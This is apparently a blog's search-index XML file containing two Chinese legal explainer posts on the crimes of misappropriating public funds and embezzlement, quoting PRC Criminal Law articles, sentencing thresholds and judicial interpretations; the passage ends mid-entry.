<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>101种职务犯罪-挪用公款罪</title>
      <link href="/2025/08/30/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E6%8C%AA%E7%94%A8%E5%85%AC%E6%AC%BE%E7%BD%AA/"/>
      <url>/2025/08/30/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E6%8C%AA%E7%94%A8%E5%85%AC%E6%AC%BE%E7%BD%AA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、刑法条文"><a href="#一、刑法条文" class="headerlink" title="一、刑法条文"></a>一、刑法条文</h2><h3 id="第三百八十四条"><a href="#第三百八十四条" class="headerlink" title="第三百八十四条"></a>第三百八十四条</h3><p>国家工作人员利用职务上的便利，挪用公款归个人使用，进行非法活动的，或者挪用公款数额较大、进行营利活动的，或者挪用公款数额较大、超过三个月未还的，是挪用公款罪，处五年以下有期徒刑或者拘役；情节严重的，处五年以上有期徒刑。挪用公款数额巨大不退还的，处十年以上有期徒刑或者无期徒刑。</p><p>挪用用于救灾、抢险、防汛、优抚、扶贫、移民、救济款物归个人使用的，从重处罚。</p><h3 id="第一百八十五条第二款"><a href="#第一百八十五条第二款" class="headerlink" title="第一百八十五条第二款"></a>第一百八十五条第二款</h3><p>国有商业银行、证券交易所、期货交易所、证券公司、期货经纪公司、保险公司或者其他国有金融机构的工作人员和国有商业银行、证券交易所、期货交易所、证券公司、期货经纪公司、保险公司或者其他国有金融机构委派到前款规定中的非国有机构<strong>从事公务</strong>的人员有前款行为的，依照本法第三百八十四条的规定定罪处罚。</p><h4 id="1-从事公务"><a href="#1-从事公务" class="headerlink" title="1.从事公务"></a>1.从事公务</h4><p>从事公务，是指代表国家机关、国有公司、企业、事业单位、人民团体等履行组织、领导、监督、管理等职责。公务主要表现为与职权相联系的公共事务以及监督、管理国有财产的职务活动。如国家机关工作人员依法履行职责，国有公司的董事、经理、监事、会计、出纳人员等管理、监督国有财产等活 动，属于从事公务。那些不具备职权内容的劳务活动、技术服务工作，如售货员、售票员等所从事的工作，一般不认为 是公务。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h3 id="第二百七十二条第二款"><a href="#第二百七十二条第二款" class="headerlink" title="第二百七十二条第二款"></a>第二百七十二条第二款</h3><p>国有公司、企业或者其他国有单位中从事公务的人员和国有公司、企业或者其他国有单位委派到非国有公司、企业以及其他单位从事公务的人员有前款行为的，依照本法第三百八十四条的规定定罪处罚。</p><h2 id="相关规定"><a href="#相关规定" class="headerlink" title="相关规定"></a>相关规定</h2><h3 id="1-非国家工作人员挪用国有资金？"><a href="#1-非国家工作人员挪用国有资金？" class="headerlink" title="1.非国家工作人员挪用国有资金？"></a>1.非国家工作人员挪用国有资金？</h3><p>对于受国家机关、国有公司、企业、事业单位、人民团体<strong>委托，管理、经营国有财产</strong>的非国家工作人员，利用职务上的便利，挪用国有资金归个人使用构成犯罪的，应当依照刑法第二百七十二条第一款的规定定罪处罚。</p><p><strong>最高人民法院《关于对受委托管理、经营国有财产人员挪用国有资金行为如何定罪问题的批复》(2000年2月24 日 法释〔2000〕5号)</strong></p><p><strong>第二百七十二条第一款：</strong>公司、企业或者其他单位的工作人员，利用职务上的便利，挪用本单位资金归个人使用或者借贷给他人，数额较大、超过三个月未还的，或者虽未超过三个月，但数额较大、进行营利活动的，或者进行非法活动的，处三年以下有期徒刑或者拘役；挪用本单位资金数额巨大的，处三年以上七年以下有期徒刑；数额特别巨大的，处七年以上有期徒刑。</p><p><strong>受委托管理、经营国有财产：</strong>刑法第三百八十二条第二款规定的“受委托管理、经营国有财产”,是指因承包、租赁、临时聘用等管理、经营国有财产。</p>]]></content>
      
      
      <categories>
          
          <category> 101种职务犯罪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 101种职务犯罪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>101种职务犯罪-贪污罪</title>
      <link href="/2025/08/17/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E8%B4%AA%E6%B1%A1%E7%BD%AA/"/>
      <url>/2025/08/17/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E8%B4%AA%E6%B1%A1%E7%BD%AA/</url>
      
        <content type="html"><![CDATA[<p>根据《中华人民共和国监察法》第11条第2项的规定，监察委员会有权对涉嫌贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊以及浪费国家资产等职务违法和职务犯罪进行调查。2021年，国家监察委员会颁布《中华人民共和国监察法实施条例》对监察机关有权管辖的职务犯罪案件范围进一步细化，具体包含101种罪名。</p><p><strong>贪污罪</strong></p><p>主体包括：<br>(1)国家机关工作人员<br>(2)国有公司、企业、事业单位、人民团体中从事公务的人员；<br>(3)国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员；<br>(4)其他依照法律从事公务的人员；<br>(5)受国家机关、国有公司、企业、事业单位、人民团体委托管理、经营国有财产的人员。</p><p><strong>误区</strong></p><p>不能认为只要国家工作人员非法占有公共财物的行为利用了职务便利，就必然成立贪污罪。</p><p>不是任何利用职务上的便利非法占有公共财物的行为都能成立贪污罪，只有当国家工作人员现实地对公共财物享有支配权、决定权，或者对具体支配财物的人员处于领导、指示、支配地位，进而利用了职务上的便利的，才能认定为<strong>贪污罪</strong>。否则，只能认定为<strong>盗窃罪、诈骗罪</strong>。</p><p>刘静坤：《刑法条文理解与司法适用》,法律出版社2021年版，第963页。</p><h2 id="一、刑法条文"><a href="#一、刑法条文" class="headerlink" title="一、刑法条文"></a>一、刑法条文</h2><h3 id="第三百八十二条"><a href="#第三百八十二条" class="headerlink" title="第三百八十二条"></a>第三百八十二条</h3><p>贪污罪是指国家工作人员<strong>利用职务上的便利</strong>，<strong>侵吞、窃取、骗取</strong>或者以其他手段非法占有<strong>公共财物</strong>。</p><p>受国家机关、国有公司、企业、事业单位、人民团体<strong>委托管理、经营国有财产</strong>的人员，利用职务上的便利，侵吞、窃取、骗取或者以其他手段非法占有国有财务的，以贪污论。</p><p>与前两款所列人员勾结，伙同贪污的，以共犯论处。</p><h4 id="1-利用职务上的便利"><a href="#1-利用职务上的便利" class="headerlink" title="1.利用职务上的便利"></a>1.利用职务上的便利</h4><p>“利用职务上的便利”是指利用职务上<strong>主管、管理、经手</strong>公共财物的权力及方便条件。</p><p><strong>主管</strong>，指负责调拨、处置及其他支配公共财物的职务活动。</p><p><strong>管理</strong>，指负责保管、处理以及其他使公共财物不流失的职务活动。</p><p><strong>经手</strong>，指领取、支出办公共财物因而占有公共财物的职务活动。</p><p>受国家机关、国有公司、企业、事业单位、人民团体委托管理、经营国有财产的人员，利用职务上的便利，侵吞、窃取、骗取或者以其他手段非法占有国有财物的，以贪污罪追究其刑事责任。</p><p><strong>最高人民检察院《关于人民检察院直接受理立案侦查案件立案标准的规定(试行)》(1999年9月16日 高检发 释字〔1999〕2号)</strong></p><h4 id="2-侵吞、窃取、骗取"><a href="#2-侵吞、窃取、骗取" class="headerlink" title="2.侵吞、窃取、骗取"></a>2.侵吞、窃取、骗取</h4><p>贪污罪中的“侵吞”“窃取”“骗取”三种手段分别与<strong>侵占罪、盗窃罪、诈骗罪</strong>相对应。</p><p>贪污罪与侵占罪、盗窃罪、诈骗罪三者在行为上存在竞合关系。贪污罪系特殊法条，侵占罪、盗窃罪、诈骗罪是一般法条，当发生法条竞合时，优先适用特殊法条，贪污罪。</p><p><strong>侵吞</strong>，是指将自己基于职务占有的公共财物据为己有或者使第三人所有，监守自盗。</p><p>侵吞包括对公共财物事实上的处分，也包括对其法律上的处分。常见的方式有不入账、平账、增加支出、缩小收入、将公共财物擅自变卖、挥霍等。</p><p><strong>根据《刑法》第394条规定</strong>：国家工作人员在国内公务活动或者对外交往中接受礼物，依照国家规定应当交公而不交公，数额较大的，以贪污罪定罪处罚。这种行为方式属于侵吞。</p><p><strong>窃取</strong>，是指将自己没有占有的公共财物变为自己占有的公共财物。只有当行为人与他人共同占有公共财物时，行为人利用职务上的便利窃取该财物的，才属于贪污罪中的“窃取”。 即利用职务上的便利，取走了他人占有的财物。在该种情形中，利用部分职务上的便利，也认为是利用了职务上的便利。</p><p><strong>骗取</strong>，是指假借职务上的合法形式，采用欺骗的手段，使具有处分权的受骗人产生认识错误，从而取得公共财物。</p><h4 id="3-公共财物"><a href="#3-公共财物" class="headerlink" title="3.公共财物"></a>3.公共财物</h4><p><strong>《刑法》第382 条：</strong>贪污罪的对象是公共财物。受委托管理、经营国有财产的人员贪污行为对象为国有财物。</p><p><strong>《刑法》第91条：</strong>本法所称公共财产，是指下列财产：(1)国有财产；(2)劳动群众集体所有的财产；(3)用于扶贫和其他公益事业的社会捐助或者专项基金的财产。在国家机关、国有公司、企业、 集体企业和人民团体管理、使用或者运输中的私人财产，以公共财产论。</p><h4 id="4-受委托管理、经营国有财产"><a href="#4-受委托管理、经营国有财产" class="headerlink" title="4.受委托管理、经营国有财产"></a>4.受委托管理、经营国有财产</h4><p>刑法第三百八十二条第二款规定的“受委托管理、经营国有财产”，是指因承包、租赁、临时聘用等管理、经营国有财产。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h3 id="第三百八十三条"><a href="#第三百八十三条" class="headerlink" title="第三百八十三条"></a>第三百八十三条</h3><p>对犯贪污罪的，根据情节轻重，分别依照下列规定处罚：</p><p>（一）贪污<strong>数额较大</strong>或者有<strong>其他较重情节</strong>的，处三年以下有期徒刑或者拘役，并处罚金。</p><p>（二）贪污<strong>数额巨大</strong>或者有<strong>其他严重情节</strong>的，处三年以上十年以下有期徒刑，并处罚金或者没收财产。</p><p>（三）贪污<strong>数额特别巨大</strong>或者有其他特别严重情节的，处十年以上有期徒刑或者无期徒刑，并处罚金或者没收财产；数额特别巨大，并使国家和人民利益遭受特别重大损失的，处无期徒刑或者死刑，并处没收财产。</p><p>对多次贪污未经处理的，按照累计贪污数额处罚。</p><p>犯第一款罪，在提起公诉前如实供述自己罪行、真诚悔罪、积极退赃，避免、减少损害结果的发生，有第一项规定情形的，可以从轻、减轻或者免除处罚；有第二项、第三项规定情形的，可以从轻处罚。</p><p>犯第一款罪，有第三项规定情形被判处死刑缓期执行的，人民法院根据犯罪情节等情况可以同时决定在其死刑缓期执行二年期满依法减为无期徒刑后，终身监禁，不得减刑、假释。</p><h4 id="1-数额较大"><a href="#1-数额较大" class="headerlink" title="1.数额较大"></a>1.数额较大</h4><p>贪污或者受贿数额在三万元以上不满二十万元的，应当认定为刑法第三百八十三条第一款规定的“数额较大”，依法判处三年以下有期徒刑或者拘役，并处罚金。</p><p><strong>《最高人民法院、最高人民检察院关于办理贪污贿赂刑事案件适用法律若干问题的解释》法 释〔2016〕9号第一条</strong></p><h4 id="2-其他较重情节"><a href="#2-其他较重情节" class="headerlink" title="2.其他较重情节"></a>2.其他较重情节</h4><p>贪污数额在一万元以上不满三万元，具有下列情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他较重情节”，依法判处三年以下有期徒刑或者拘役，并处罚金：</p><p>（一）贪污救灾、抢险、防汛、优抚、扶贫、移民、救济、防疫、社会捐助等特定款物的；</p><p>（二）曾因贪污、受贿、挪用公款受过党纪、行政处分的；</p><p>（三）曾因故意犯罪受过刑事追究的；</p><p>（四）赃款赃物用于非法活动的；</p><p>（五）拒不交待赃款赃物去向或者拒不配合追缴工作，致使无法追缴的；</p><p>（六）造成恶劣影响或者其他严重后果的。</p><p>　受贿数额在一万元以上不满三万元，具有前款第二项至第六项规定的情形之一，或者具有下列情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他较重情节”，依法判处三年以下有期徒刑或者拘役，并处罚金：</p><p>（一）多次索贿的；</p><p>（二）为他人谋取不正当利益，致使公共财产、国家和人民利益遭受损失的；</p><p>（三）为他人谋取职务提拔、调整的。</p><p><strong>2016年4月18日《最高人民法院、最高人民检察院关于办理贪污贿赂刑事案件适用法律若干问题的解释》法 释〔2016〕9号第一条</strong></p><h4 id="3-数额巨大"><a href="#3-数额巨大" class="headerlink" title="3.数额巨大"></a>3.数额巨大</h4><p>贪污或者受贿数额在二十万元以上不满三百万元的，应当认定为刑法第三百八十三条第一款规定的“数额巨大”，依法判处三年以上十年以下有期徒刑，并处罚金或者没收财产。</p><p>贪污数额在十万元以上不满二十万元，具有本解释第一条第二款规定的情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他严重情节”，依法判处三年以上十年以下有期徒刑，并处罚金或者没收财产。</p><p>受贿数额在十万元以上不满二十万元，具有本解释第一条第三款规定的情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他严重情节”，依法判处三年以上十年以下有期徒刑，并处罚金或者没收财产。</p><p><strong>2016年4月18日《最高人民法院、最高人民检察院关于办理贪污贿赂刑事案件适用法律若干问题的解释》法 释〔2016〕9号 第二条</strong></p><h4 id="4-数额特别巨大"><a href="#4-数额特别巨大" class="headerlink" title="4.数额特别巨大"></a>4.数额特别巨大</h4><p>贪污或者受贿数额在三百万元以上的，应当认定为刑法第三百八十三条第一款规定的“数额特别巨大”，依法判处十年以上有期徒刑、无期徒刑或者死刑，并处罚金或者没收财产。</p><p>贪污数额在一百五十万元以上不满三百万元，具有本解释第一条第二款规定的情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他特别严重情节”，依法判处十年以上有期徒刑、无期徒刑或者死刑，并处罚金或者没收财产。</p><p>受贿数额在一百五十万元以上不满三百万元，具有本解释第一条第三款规定的情形之一的，应当认定为刑法第三百八十三条第一款规定的“其他特别严重情节”，依法判处十年以上有期徒刑、无期徒刑或者死刑，并处罚金或者没收财产。</p><p><strong>2016年4月18日《最高人民法院、最高人民检察院关于办理贪污贿赂刑事案件适用法律若干问题的解释》法 释〔2016〕9号 第三条</strong></p><h3 id="第九十一条"><a href="#第九十一条" class="headerlink" title="第九十一条"></a>第九十一条</h3><p>本法所称公共财产，是指下列财产：</p><p>（一）国有财产</p><p>（二）劳动群体集体所有的财产</p><p>（三）用于扶贫和其他公益事业的社会捐助或者专项基金的财产</p><p>在国家机关、国有公司、企业、集体企业和人民团体管理、使用或者运输中的私人财产，以公共财产论。</p><h3 id="第九十三条"><a href="#第九十三条" class="headerlink" title="第九十三条"></a>第九十三条</h3><p>本法所称的国家工作人员，是指<strong>国家机关中从事公务的人员</strong>。</p><p>国有公司、企业、事业单位、人民团体中从事公务的人员和<strong>国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员</strong>，以及<strong>其他依照法律从事公务的人员</strong>，以国家工作人员论。</p><h4 id="1-国家机关中从事公务的人员"><a href="#1-国家机关中从事公务的人员" class="headerlink" title="1.国家机关中从事公务的人员"></a>1.国家机关中从事公务的人员</h4><p>刑法中所称的国家机关工作人员，是指在国家机关中从事公务的人员，包括在各级国家权力机关、行政机关、司法机关和军事机关中从事公务的人员。</p><p>根据有关立法解释的规定，在依照法律、法规规定行使国家行政管理职权的组织中从事公务的人员，或者在受国家机关委托代表国家行使职权的组织中从事公务的人员，或者虽未列入国家机关人员编制但在国家机关中从事公务的人员，视为国家机关工作人员。在乡(镇)以上中国共产党机关、人民政协机关中从事公务的人员，司法实践中也应当视为国家机关工作人员。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><p>经国家机关、国有公司、企业、事业单位提名、推荐、任命、批准等，在国有控股、参股公司及其分支机构中从事公务的人员，应当认定为国家工作人员。具体的任命机构和程序，不影响国家工作人员的认定。经国家出资企业中负有管理、监督国有资产职责的组织批准或者研究决定，代表其在国有控股、参股公司及其分支机构中从事组织、领导、监督、经营、管理工作的人员，应当认定为国家工作人员。国家出资企业中的国家工作人员，在国家出资企业中持有个人股份或者同时接受非国有股东委托的，不影响其国家工作人员身份的认定。</p><p>“国家出资企业”，包括国家出资的国有独资公司、国有独资企业，以及国有资本控股公司、国有资本参股公司。</p><p>是否属于国家出资企业不清楚的，应遵循“谁投资、谁拥有产权”的原则进行界定。企业注册登记中的资金来源与实际出资不符的，应根据实际出资情况确定企业的性质。企业实际出资情况不清楚的，可以综合工商注册、分配形式、经营管理等因素确定企业的性质。</p><p><strong>最高人民法院、最高人民检察院《关于办理国家出资企业中职务犯罪案件具体应用法律若干问题的意见》(2010 年11月26日 法发〔2010〕 49号)</strong></p><h4 id="2-从事公务"><a href="#2-从事公务" class="headerlink" title="2.从事公务"></a>2.从事公务</h4><p>从事公务，是指代表国家机关、国有公司、企业、事业单位、人民团体等履行组织、领导、监督、管理等职责。公务主要表现为与职权相联系的公共事务以及监督、管理国有财产的职务活动。如国家机关工作人员依法履行职责，国有公司的董事、经理、监事、会计、出纳人员等管理、监督国有财产等活动，属于从事公务。那些不具备职权内容的劳务活动、技术服务工作，如售货员、售票员等所从事的工作，一般不认为是公务。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h4 id="3-国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员"><a href="#3-国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员" class="headerlink" title="3.国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员"></a>3.国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员</h4><p>所谓委派，即委任、派遣，其形式多种多样，如任命、指派、提名、批准等。不论被委派的人身份如何，只要是接受国 家机关、国有公司、企业、事业单位委派，代表国家机关、国有公司、企业、事业单位在非国有公司、企业、事业单位、社会团体中从事组织、领导、监督、管理等工作，都可以认定为国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员。</p><p>国家机关、国有公司、企业、事业单位委派在国有控股或者参股的股份有限公司从事组织、领导、监督、管理等工作的人员，应当以国家工作人员论。国有公司、企业改制为股份有限公司后，原国有公司、企业的工作人员和股份有限公司新任命的人员中，除代表国有投资主体行使监督、管理职权的人外，不以国家工作人员论。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h4 id="4-委派"><a href="#4-委派" class="headerlink" title="4.委派"></a><strong>4.委派</strong></h4><p>一是形式特征，委派在形式上可以不拘一格，如任命、指派、提名、推荐、认可、同意、批准等均无不可。</p><p>二是实质特征，需代表国家机关、国有公司、企业、事业单位在非国有公司、企业、事业单位、社会团体中从事组织、领导、监督、管理等公务活动，亦即国有单位意志的直接代表性。</p><p>概括为：</p><p>1.委派的形式多样，不拘一格。可以是任命、指派、提名、批准、同意、事后的任命或批准等。</p><p>2.委派的实质在于国有单位意志的直接代表性，即国有单位的意志行为的关联性和延续性。被委派人员去非国有单位</p><p>必须从事公务，而非劳务性、技术性的工作。虽然委派的形式多种多样，被委派人的身份千差万别，但被委派人员的工作内容必须是公务，即履行组织、领导、监督、管理等职责。因此在实践中只需把握好“受委派”和“从事公务”两个特征。</p><p>3.被委派人员在被委派以前的身份，不影响其拥有国家工作人员的身份。不论被委派人员之前是否为国家工作人员，</p><p>是否属于在编人员，委派是书面委任文件还是提名，直接任职后委派还是临时委派，都不影响对其最终国家工作人员身份的认定。</p><p><strong>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</strong></p><h4 id="5-其他依照法律从事公务的人员"><a href="#5-其他依照法律从事公务的人员" class="headerlink" title="5.其他依照法律从事公务的人员"></a>5.其他依照法律从事公务的人员</h4><p>村民委员会等村基层组织人员协助人民政府从事下列行政管理工作，属于刑法第九十三条第二款规定的“其他依照法律从事公务的人员。<br>1.救灾、抢险、防汛、优抚、扶贫、移民、救济款物的管理；</p><p>2.社会捐助公益事业款物的管理；</p><p>3.国有土地的经营和管理；</p><p>4.土地征收、征用补偿费用的管理；</p><p>5.代征、代缴税款；</p><p>6.有关计划生育、户籍、征兵工作； </p><p>7.协助人民政府从事的其他行政管理工作。</p><p>村民委员会等村基层组织人员从事前款规定的公务，利用职务上的便利，非法占有公共财物、挪用公款、索取他人财物或者非法收受他人财物，构成犯罪的，适用刑法第三百八十二条和第三百八十三条贪污罪、第三百八十四条挪用公款罪、第三百八十五条和第三百八十六条受贿罪的规定。</p><p><strong>全国人民代表大会常务委员会《关于〈中华人民共和国刑法》第九十三条第二款的解释》(2009年8月27日)</strong></p><p>一是在特定条件下行使国家管理职能；</p><p>二是依照法律规定从事公务。具体包括：</p><p>（1）依法履行职责的各级人民代表大会代表；</p><p>（2）依法履行审判职责的人民陪审员；</p><p>（3）协助乡镇人民政府、街道办事处从事行政管理丁作的村民委员会、居民委员会等农村和城市基层组织人员；</p><p>（4）其他由法律授权从事公务的人员。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h3 id="第一百八十三条第二款"><a href="#第一百八十三条第二款" class="headerlink" title="第一百八十三条第二款"></a>第一百八十三条第二款</h3><p>国有保险公司工作人员和国有保险公司委派到非国有保险公司从事公务的人员有前款行为的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p><h3 id="第二百七十一条第二款"><a href="#第二百七十一条第二款" class="headerlink" title="第二百七十一条第二款"></a>第二百七十一条第二款</h3><p>国有公司、企业或者其他国有单位中从事公务的人员和国有公司、企业或者其他国有单位委派到非国有公司、企业以及其他单位从事公务的人员有前款行为的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p><h3 id="第三百九十四条"><a href="#第三百九十四条" class="headerlink" title="第三百九十四条"></a>第三百九十四条</h3><p>国家工作人员在国内公务活动或者对外交往中接受礼物，依照国家规定应当交公而不交公，数额较大的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p><h2 id="二、犯罪客体"><a href="#二、犯罪客体" class="headerlink" title="二、犯罪客体"></a>二、犯罪客体</h2><p>贪污行为对公共财务的侵害，表现为侵害公共财务的所有权。</p><p>贪污行为对职务廉洁性的侵害，表现为使得公务活动效率降低，损害党和政府在人民群众中的形象。</p><h2 id="三、相关规定"><a href="#三、相关规定" class="headerlink" title="三、相关规定"></a>三、相关规定</h2><h3 id="1-如何认定共同犯罪？"><a href="#1-如何认定共同犯罪？" class="headerlink" title="1.如何认定共同犯罪？"></a>1.如何认定共同犯罪？</h3><p>第一条　行为人与国家工作人员勾结，利用国家工作人员的职务便利，共同侵吞、窃取、骗取或者以其他手段非法占有公共财物的，以贪污罪共犯论处。</p><p>第二条　行为人与公司、企业或者其他单位的人员勾结，利用公司、企业或者其他单位人员的职务便利，共同将该单位财物非法占为己有，数额较大的，以职务侵占罪共犯论处。</p><p>第三条　公司、企业或者其他单位中，不具有国家工作人员身份的人与国家工作人员勾结，分别利用各自的职务便利，共同将本单位财物非法占为己有的，按照主犯的犯罪性质定罪。</p><p><strong>最高人民法院《关于审理贪污、职务侵占案件如何认定共同犯罪几个问题的解释》(2000年7月8日 法释 〔2000〕15号)</strong></p><h3 id="公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？"><a href="#公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？" class="headerlink" title="公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？"></a>公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？</h3><p>受国有单位委派到非国有单位从事公务的人员的认定关键要把握好“受委派”和“从事公务”两个特征。对于“受委派”,无论是书面委任文件还是提名，只要是有证据证明属于上述委派形式之一即可。在国有单位是公司实际投资人的情况下，聘任行为人担任公司负责人，属于国有单位履行投资主体的权利。投资主体委派公司负责人与股东选举公司经理是两个不同的程序，不能因为公司经理须经股东会选举程序而否认其受国有单位委派从事公务的性质。</p><p><strong>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</strong></p><h3 id="2-如何认定村委会、村民小组长等村基层组织人员是否-“从事公务”"><a href="#2-如何认定村委会、村民小组长等村基层组织人员是否-“从事公务”" class="headerlink" title="2.如何认定村委会、村民小组长等村基层组织人员是否 “从事公务”?"></a>2.如何认定村委会、村民小组长等村基层组织人员是否 “从事公务”?</h3><p>第一看行为人处理相关事务是村基层组织的事务还是人民政府的事务。第二看行为人处理相关事务是否具有职权内容。村基层组织人员如果是在协助人民政府从事《全国人民代表大会常务委员会关于中华人民共和国刑法第九十三条第二款的解释》规定的行政管理工作，应当属于“其他依照法律从事公务的人员”。村基层组织人员代表村委会管理村集体事务的不属于“从事公务”。</p><p><strong>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</strong></p><h3 id="3-具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚"><a href="#3-具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚" class="headerlink" title="3.具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚?"></a>3.具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚?</h3><p>一般应当尽量区分主从犯，按照主犯的犯罪性质定罪。需要特别指出的是，共同犯罪中同案犯具有不同的特定身份，不是一律依其不同身份分别定罪，关键是看各行为人是否分别利用了本人的职务便利实施犯罪。司法实践中，如果根据案件的实际情况，各共同犯罪人在共同犯罪中的地位、作用相当，难以区分主从犯的，可以以贪污罪或者受贿罪定罪处罚。</p><p><strong>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</strong></p><h3 id="4-村民小组组长利用职务便利非法占有公共财物行为如何定性？"><a href="#4-村民小组组长利用职务便利非法占有公共财物行为如何定性？" class="headerlink" title="4.村民小组组长利用职务便利非法占有公共财物行为如何定性？"></a>4.村民小组组长利用职务便利非法占有公共财物行为如何定性？</h3><p>对村民小组组长利用职务上的便利，将村民小组集体财产非法占为己有，数额较大的行为，应当依照刑法第二百七十一条第一款的规定，以职务侵占罪定罪处罚。</p><p><strong>最高人民法院《关于村民小组组长利用职务便利非法占有公共财物行为如何定性问题的批复》(1999年6月25 日 法释〔1999〕12号)</strong></p><h3 id="5-如何认定贪污罪中非法占有的目的？"><a href="#5-如何认定贪污罪中非法占有的目的？" class="headerlink" title="5.如何认定贪污罪中非法占有的目的？"></a>5.如何认定贪污罪中非法占有的目的？</h3><p>贪污罪中非法占有的目的需要结合公共财务的具体去向及行为人处置意思来认定。</p><p>要区分形式上的侵吞行为与贪污罪中以非法占有目的的侵吞行为，以免客观规罪。</p><p>不能仅凭行为人具备将公共财务据为己有的客观可能性而据此推定行为人具有将公共财产占为己有的主观目的。</p><p><strong>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</strong></p><h3 id="6-不动产能否成为贪污犯罪对象？"><a href="#6-不动产能否成为贪污犯罪对象？" class="headerlink" title="6.不动产能否成为贪污犯罪对象？"></a>6.不动产能否成为贪污犯罪对象？</h3><p>国家工作人员利用职务上的便利为请托人谋取利益，收受请托人房屋、汽车等物品，未变更权属登记或者借用他人名义办理权属变更登记的，不影响受贿的认定。</p><p><strong>关于办理受贿刑事案件适用法律若干问题的意见 2007年7月8日 法发（2007）22号</strong></p><p>如果行为人能够享有不动产的占有、使用、收益权能，即实质上行使了不动产的所有权，则当认定其贪污的对象为不动产本身。</p><h3 id="7-贪污罪的既遂、未遂问题"><a href="#7-贪污罪的既遂、未遂问题" class="headerlink" title="7.贪污罪的既遂、未遂问题"></a>7.贪污罪的既遂、未遂问题</h3><p>贪污罪是一种以非法占有为目的的财产性职务犯罪，与盗窃、诈骗、抢夺等侵犯财产罪一样，应当以行为人是否实际控制财物作为区分贪污罪既遂与未遂的标准。对于行为人利用职务上的便利，实施了虚假平账等贪污行为，但公共财物尚未实际转移，或者尚未被行为人控制就被查获的，应当认定为贪污未遂。行为人控制公共财物后，是否将财物据为己有，不影响贪污既遂的认定。</p><p><strong>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</strong></p><h3 id="8-贪污罪与职务侵占罪"><a href="#8-贪污罪与职务侵占罪" class="headerlink" title="8.贪污罪与职务侵占罪"></a>8.贪污罪与职务侵占罪</h3><p>贪污罪与职务侵占罪的区别主要在于犯罪主体、犯罪客体 方面，即是否属于从事公务的国家工作人员、是否侵吞了公共财物。职务侵占罪的主体一般不包括国家工作人员。</p><h3 id="9-贪污罪与受贿罪"><a href="#9-贪污罪与受贿罪" class="headerlink" title="9.贪污罪与受贿罪"></a>9.贪污罪与受贿罪</h3><p>贪污罪行为人所取得的是国家、单位的公共财物(包括本单位管理、 使用或者运输中的财物)。</p><p>受贿罪行为人所取得的主要是他人 (包括单位)的财物。</p><h3 id="10-贪污罪和诈骗罪"><a href="#10-贪污罪和诈骗罪" class="headerlink" title="10.贪污罪和诈骗罪"></a>10.贪污罪和诈骗罪</h3><p>在国家工作人员的行为构成诈骗罪的前提下，是否另触犯贪污罪，主要取决于行为对象是不是公共财物，以及行为人是否利用了职务便利。贪污罪中的利用职务上的便利不是简单的相加关系，而是具有内在的关联性。</p><p>只有当国家工作人员拥有基于职务占有公共财物的便利(权利),并基于此占有了公共财物；或者该国家工作人员拥有对基于职务占有公共 财物的人员的领导、指示地位，并且利用这种职务上的便利支 配该人员的职务行为，因而获得公共财物。</p><p>不是这两种权利的 行为，即使主体为国家工作人员，也不成立贪污罪，只能认定 为盗窃罪、诈骗罪等罪。</p>]]></content>
      
      
      <categories>
          
          <category> 101种职务犯罪 </category>
          
      </categories>
      
      
        <tags>
            
